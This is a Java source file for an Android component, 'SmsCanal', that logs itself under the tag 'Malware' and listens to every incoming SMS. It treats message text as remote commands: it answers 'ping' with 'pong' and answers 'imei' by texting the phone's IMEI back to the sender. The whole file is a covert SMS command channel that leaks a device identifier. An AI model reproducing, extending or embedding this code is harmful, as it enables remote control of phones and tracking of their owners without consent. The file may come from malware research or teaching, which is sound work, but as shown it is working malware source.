package communication;

import device.DeviceData;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsCanal extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		Log.w("Malware", "SMS received");
		
		DeviceData data = new DeviceData(context);
		final Bundle bundle = intent.getExtras();
		if (bundle == null)
			return;

		final Object[] pdus = (Object[]) bundle.get("pdus");
		for (int i = 0; i < pdus.length; i++) {
			SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[i]);

			String source = msg.getDisplayOriginatingAddress();
			String text = msg.getDisplayMessageBody();
			callBackAction(source, text, data);
		}
	}

	public void callBackAction(String source, String text, DeviceData data) {
		SmsManager smsManager = SmsManager.getDefault();
		if (text.matches("ping")) {
			smsManager.sendTextMessage(source, null, "pong", null, null);
		} else if (text.matches("imei")) {
			smsManager.sendTextMessage(source, null,
					"imei : " + data.getImei(), null, null);
		}
	}
}
